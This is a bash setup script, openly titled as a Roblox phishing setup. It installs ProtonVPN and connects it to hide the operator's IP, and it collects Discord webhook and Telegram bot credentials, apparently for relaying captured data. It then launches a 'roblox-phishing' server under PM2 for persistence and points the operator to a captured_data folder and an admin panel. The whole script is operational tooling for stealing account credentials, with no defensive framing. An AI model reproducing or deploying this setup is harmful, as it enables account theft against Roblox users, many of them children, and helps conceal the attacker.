#!/bin/bash

echo "================================================"
echo "🎣 ROBLOX PHISHING SETUP WITH PROTONVPN"
echo "================================================"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "❌ Please run as root (sudo ./setup.sh)"
    exit 1
fi

echo "📦 Step 1: Installing dependencies..."
apt update && apt upgrade -y
apt install -y nodejs npm git curl wget

echo ""
echo "🔐 Step 2: Installing ProtonVPN..."
wget -q https://repo.protonvpn.com/debian/dists/stable/main/binary-all/protonvpn-stable-release_1.0.3-2_all.deb
dpkg -i protonvpn-stable-release_1.0.3-2_all.deb 2>/dev/null
apt update
apt install -y protonvpn

echo ""
echo "🔑 Step 3: ProtonVPN Login"
echo "Enter your ProtonVPN credentials:"
protonvpn-cli login

echo ""
echo "🌐 Step 4: Connecting to VPN..."
echo "Connecting to fastest server..."
protonvpn-cli connect --fastest

echo ""
echo "✅ Verifying connection..."
sleep 3
CURRENT_IP=$(curl -s https://api.ipify.org)
echo "Current IP: $CURRENT_IP"

echo ""
echo "📦 Step 5: Installing Node.js dependencies..."
npm install

echo ""
echo "⚙️  Step 6: Configuration"
echo "Do you want to setup Discord webhook? (y/n)"
read -r setup_discord

if [ "$setup_discord" = "y" ]; then
    echo "Enter Discord webhook URL:"
    read -r discord_webhook
    echo "DISCORD_WEBHOOK=$discord_webhook" > .env
fi

echo ""
echo "Do you want to setup Telegram bot? (y/n)"
read -r setup_telegram

if [ "$setup_telegram" = "y" ]; then
    echo "Enter Telegram bot token:"
    read -r telegram_token
    echo "Enter Telegram chat ID:"
    read -r telegram_chat
    echo "TELEGRAM_BOT_TOKEN=$telegram_token" >> .env
    echo "TELEGRAM_CHAT_ID=$telegram_chat" >> .env
fi

echo ""
echo "📦 Step 7: Installing PM2 for auto-restart..."
npm install -g pm2

echo ""
echo "🚀 Step 8: Starting server..."
pm2 start server.js --name roblox-phishing
pm2 startup
pm2 save

echo ""
echo "================================================"
echo "✅ SETUP COMPLETE!"
echo "================================================"
echo ""
echo "🌐 VPN Status: Connected"
echo "📍 Your IP: $CURRENT_IP"
echo ""
echo "🔗 Access URLs:"
echo "   Public: http://localhost:3000"
echo "   Admin:  http://localhost:3000/admin"
echo ""
echo "📊 Useful Commands:"
echo "   pm2 logs roblox-phishing  - View logs"
echo "   pm2 restart roblox-phishing - Restart server"
echo "   pm2 stop roblox-phishing - Stop server"
echo "   protonvpn-cli status - Check VPN status"
echo "   protonvpn-cli disconnect - Disconnect VPN"
echo ""
echo "⚠️  IMPORTANT:"
echo "   - NEVER disconnect VPN while running"
echo "   - Check logs at: captured_data/"
echo "   - Admin panel: http://your-ip:3000/admin"
echo ""
echo "================================================"
